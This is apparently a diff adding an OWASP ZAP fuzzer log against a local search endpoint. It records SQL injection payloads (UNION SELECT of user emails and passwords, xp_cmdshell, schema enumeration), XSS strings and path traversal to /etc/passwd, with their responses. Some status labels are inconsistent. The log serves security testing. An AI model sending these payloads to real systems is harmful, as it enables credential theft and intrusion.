@@ -1,0 +1,29 @@
+OWASP ZAP Fuzzer Execution Log
+Target: http://localhost:3000/rest/products/search?q={PAYLOAD}
+Timestamp: 2026-10-28 18:18:14
+================================================================================
+
+[01] Payload: '                                        | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4120 ms | State: Server Error
+[02] Payload: ''                                       | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4096 ms | State: Server Error
+[03] Payload: `                                        | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4082 ms | State: Server Error
+[04] Payload: ``                                       | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4092 ms | State: Server Error
+[05] Payload: ,                                        | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4103 ms | State: Server Error
+[06] Payload: "                                        | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4097 ms | State: Server Error
+[07] Payload: ""                                       | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4103 ms | State: Server Error
+[08] Payload: ' OR '1'='1                              | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4078 ms | State: Server Error
+[09] Payload: ' OR '1'='1' --                          | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4085 ms | State: Server Error
+[10] Payload: ' OR '1'='1' /*                          | Status: 500 <urlopen error [WinError 10061] Δεν ήταν δυνατή η δημιουργία σύνδεσης, επειδή ο υπολογιστής προορισμού την απέρριψε ενεργά> | Size:      0 B | RTT: 4089 ms | State: Server Error
+[11] Payload: admin' --                                | Status: 500 [WinError 10054] Μια υπάρχουσα σύνδεση διακόπηκε υποχρεωτικά από τον απομακρυσμένο υπολογιστή | Size:      0 B | RTT: 5006 ms | State: Server Error
+[12] Payload: ')) OR 1=1--                             | Status: 200 OK         | Size:  34158 B | RTT: 5045 ms | State: Found (Records Returned)
+[13] Payload: ')) UNION SELECT 1,2,3,4,5,6,7,8,9--     | Status: 500 Internal Server Error | Size:    497 B | RTT: 5013 ms | State: Vulnerable (SQL Syntax Error)
+[14] Payload: ')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users-- | Status: 500 Internal Server Error | Size:    583 B | RTT: 5036 ms | State: Vulnerable (SQL Syntax Error)
+[15] Payload: 1' ORDER BY 1--+                         | Status: 500 Internal Server Error | Size:    345 B | RTT: 5016 ms | State: Vulnerable (SQL Syntax Error)
+[16] Payload: 1' ORDER BY 10--+                        | Status: 500 Internal Server Error | Size:    347 B | RTT: 5021 ms | State: Vulnerable (SQL Syntax Error)
+[17] Payload: 1' UNION SELECT null, table_name FROM information_schema.tables-- | Status: 500 Internal Server Error | Size:    443 B | RTT: 5010 ms | State: Vulnerable (SQL Syntax Error)
+[18] Payload: '; EXEC xp_cmdshell('dir')--             | Status: 500 Internal Server Error | Size:    361 B | RTT: 5029 ms | State: Vulnerable (SQL Syntax Error)
+[19] Payload: ' AND 1=0 UNION SELECT 1, 'admin', 'pass', 4, 5, 6, 7, 8, 9-- | Status: 500 Internal Server Error | Size:    435 B | RTT: 5014 ms | State: Vulnerable (SQL Syntax Error)
+[20] Payload: <script>alert('XSS')</script>            | Status: 500 Internal Server Error | Size:    367 B | RTT: 5027 ms | State: Vulnerable (SQL Syntax Error)
+[21] Payload: <iframe src="javascript:alert(1)">       | Status: 200 OK         | Size:     30 B | RTT: 5011 ms | State: OK
+[22] Payload: ../../../../etc/passwd                   | Status: 200 OK         | Size:     30 B | RTT: 5031 ms | State: OK
+[23] Payload: ..\..\..\windows\win.ini                 | Status: 200 OK         | Size:     30 B | RTT: 5018 ms | State: OK
+[24] Payload: test_benign_query                        | Status: 200 OK         | Size:     30 B | RTT: 5035 ms | State: OK
